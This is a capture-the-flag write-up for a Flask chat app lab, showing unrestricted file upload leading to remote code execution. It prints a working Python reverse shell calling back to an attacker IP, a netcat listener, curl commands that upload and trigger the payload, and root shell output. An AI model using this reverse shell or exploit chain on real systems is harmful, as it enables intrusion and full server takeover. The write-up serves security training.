# Speed Chatter - CTF Writeup

## Challenge Information
- **Challenge Name:** Speed Chatter
- **Target:** `http://10.80.143.156:5000`
- **Vulnerability:** Unrestricted File Upload leading to Remote Code Execution (RCE)

## Reconnaissance

Initial exploration revealed a Valentine's Day themed messaging platform called "Speed Chatter" running on port 5000. The challenge description emphasized that the platform was "rushed to production without proper testing."

The web application featured:
- A public chat room with real-time messaging (polling every 3 seconds)
- Profile system with username "demo"
- **File upload functionality** for profile pictures
- No authentication required

## Vulnerability Analysis

The challenge title "Speed Chatter" and the "rushed development" narrative strongly suggested race condition vulnerabilities. However, upon deeper analysis, the critical vulnerability was found in the file upload feature.

### Key Observations:
1. Profile picture upload endpoint: `/upload_profile_pic`
2. Uploaded files stored in `/uploads/` directory with preserved extensions
3. No file type validation or execution restrictions
4. Server running Werkzeug/Python 3.10.12 (Flask backend)

## Exploitation

### Step 1: Crafting the Payload
Created a Python reverse shell payload targeting the attacker machine:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.80.124.81",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

Saved as `shell.py`

### Step 2: Setting Up Listener
Started netcat listener on attacker machine:
```bash
nc -lvnp 4444
```

### Step 3: Uploading Malicious File
Uploaded the Python reverse shell through the profile picture upload form:
```bash
curl -X POST http://10.80.143.156:5000/upload_profile_pic \
  -F "profile_pic=@shell.py"
```

The server accepted the `.py` file and stored it with a UUID-based filename in the uploads directory.

### Step 4: Identifying Upload Location
The server response revealed the uploaded file path in the HTML:
```html
<img src='/uploads/profile_0407fc60-ba81-4620-b15c-7c43e4ca97e8.py' class='profile-pic'>
```

### Step 5: Triggering Remote Code Execution
Accessed the uploaded Python file directly to trigger execution:
```bash
curl http://10.80.143.156:5000/uploads/profile_0407fc60-ba81-4620-b15c-7c43e4ca97e8.py
```

### Step 6: Shell Access and Flag Retrieval
Received reverse shell connection with root privileges:
```bash
Connection received on 10.80.143.156 57816
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
app.py
flag.txt
uploads
# cat flag.txt
THM{...}
```

## Attack Chain Summary

1. **Reconnaissance** → Identified Flask/Werkzeug application with file upload functionality
2. **Vulnerability Discovery** → Found unrestricted file upload accepting `.py` files
3. **Payload Creation** → Crafted Python reverse shell
4. **Listener Setup** → Started netcat listener on port 4444
5. **File Upload** → Uploaded malicious `.py` file as profile picture
6. **RCE Trigger** → Accessed uploaded file via direct URL to execute payload
7. **Flag Capture** → Retrieved flag from `flag.txt` with root shell access

## Key Vulnerabilities

1. **Unrestricted File Upload** - No validation on file types or extensions
2. **Arbitrary Code Execution** - Server executes uploaded Python files when accessed
3. **No Authentication/Authorization** - File upload available without login
4. **Predictable Upload Directory** - Files stored in accessible `/uploads/` path
5. **Excessive Permissions** - Application running with root privileges
